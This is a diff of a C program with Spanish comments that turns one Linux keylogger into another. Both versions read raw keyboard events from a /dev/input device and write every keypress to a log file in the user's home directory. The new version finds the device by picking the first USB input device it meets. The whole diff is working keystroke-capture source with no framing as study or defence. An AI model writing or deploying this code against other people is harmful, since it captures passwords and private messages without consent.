@@ -1,81 +1,94 @@
 #include <stdio.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <linux/input.h>
-#include <sys/stat.h>
-#include <string.h>
 #include <stdlib.h>
-#include <errno.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <linux/input.h>
+#include <string.h>
+#include <dirent.h>
 
-#define LOGFILEPATH "/home/Nombre_de_usuario/keylogger.txt"
+#define HOME_DIR getenv("HOME")
+#define LOG_FILE "/Desktop/keylogging.txt"
+#define INPUT_DIR "/dev/input/"
 
-// Mapeo basico de codigos de teclas a caracteres
-char *keycodes[] = {
-    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
-    "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<LCTRL>",
-    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<LSHIFT>", "\\", "z", "x", "c",
-    "v", "b", "n", "m", ",", ".", "/", "<RSHIFT>", "*", "<LALT>", " ", "<CAPSLOCK>"
-    // Puedes agregar mas codigos de teclas segun sea necesario
-};
+void log_key(int code) {
+    char log_path[256];
+    snprintf(log_path, sizeof(log_path), "%s%s", HOME_DIR, LOG_FILE);
 
-// Funcion para escribir la tecla en el archivo de log
-void log_key(int code, FILE *fp) {
-    if (code >= 0 && code < sizeof(keycodes) / sizeof(char*)) {
-        fprintf(fp, "%s", keycodes[code]);
-    } else {
-        fprintf(fp, "<UNKNOWN>");
+    FILE *file = fopen(log_path, "a");
+    if (file == NULL) {
+        perror("No se pudo abrir el archivo de registro");
+        exit(EXIT_FAILURE);
     }
+
+    fprintf(file, "Keycode: %d\n", code);
+    fclose(file);
 }
 
-char *getEvent();
-
-int main() {
-    struct input_event ev;
-    // ruta al directorio de inputs
-    static char path_keyboard[20] = "/dev/input/";
-    // concatenar variable keyboard
-    strcat(path_keyboard, getEvent());
-    // eliminar ultimo caracter (breakline)
-    path_keyboard[strlen(path_keyboard) - 1] = 0;
-    // leer ruta a input
-    int device_keyboard = open(path_keyboard, O_RDONLY);
-    // imprimir error
-    if (device_keyboard == -1) {
-        printf("Error al abrir el dispositivo: %d\n", errno);
-        return 1;
-    }
-    // abrir fichero de logs
-    FILE *fp = fopen(LOGFILEPATH, "a");
-    if (!fp) {
-        printf("Error al abrir el archivo de log: %d\n", errno);
-        close(device_keyboard);
-        return 1;
+char* find_keyboard_device() {
+    struct dirent *entry;
+    DIR *dp = opendir(INPUT_DIR);
+    if (dp == NULL) {
+        perror("No se pudo abrir el directorio de dispositivos de entrada");
+        exit(EXIT_FAILURE);
     }
 
-    while (1) {
-        read(device_keyboard, &ev, sizeof(ev));
-        if (ev.type == EV_KEY && ev.value == 0) { // Se libera la tecla
-            printf("%c\n", ev.code);
-            log_key(ev.code, fp);  // Convertir y escribir en el archivo de log
-            fflush(fp);  // Asegura que se escriba en el archivo inmediatamente
+    char device_path[256];
+    static char keyboard_device[256];
+
+    while ((entry = readdir(dp))) {
+        if (strncmp(entry->d_name, "event", 5) == 0) {
+            snprintf(device_path, sizeof(device_path), "%s%s", INPUT_DIR, entry->d_name);
+
+            int fd = open(device_path, O_RDONLY);
+            if (fd == -1) continue;
+
+            struct input_id device_info;
+            ioctl(fd, EVIOCGID, &device_info);
+            close(fd);
+
+            // Filtrar por ID de fabricante y producto (puede variar según el teclado)
+            // Aquí, se asume que el ID de producto y fabricante corresponde a un teclado genérico.
+            if (device_info.bustype == BUS_USB) {  // Verificar si el dispositivo es USB
+                strcpy(keyboard_device, device_path);
+                closedir(dp);
+                return keyboard_device;
+            }
         }
     }
 
-    fclose(fp);
-    close(device_keyboard);
-    return 0;
+    closedir(dp);
+    return NULL;
 }
 
-char *getEvent() {
-    // leer el fichero devices y extraer el input que se refiera al teclado
-    char *command = "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
-    static char event[8];
-    FILE *pipe = popen(command, "r");
-    if (!pipe)
-        exit(1);
-    // obtener la cadena de texto del evento correspondiente al teclado
-    fgets(event, 8, pipe);
-    pclose(pipe);
-    // retornar el evento
-    return event;
+int main() {
+    char *device = find_keyboard_device();
+    if (device == NULL) {
+        fprintf(stderr, "No se encontró un dispositivo de teclado.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Dispositivo de teclado encontrado: %s\n", device);
+
+    struct input_event ev;
+    int fd = open(device, O_RDONLY);
+    if (fd == -1) {
+        perror("No se pudo abrir el dispositivo de entrada");
+        return EXIT_FAILURE;
+    }
+
+    while (1) {
+        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
+            perror("Error al leer el evento de entrada");
+            close(fd);
+            return EXIT_FAILURE;
+        }
+
+        if (ev.type == EV_KEY && ev.value == 1) {
+            log_key(ev.code);
+        }
+    }
+
+    close(fd);
+    return EXIT_SUCCESS;
 }
+
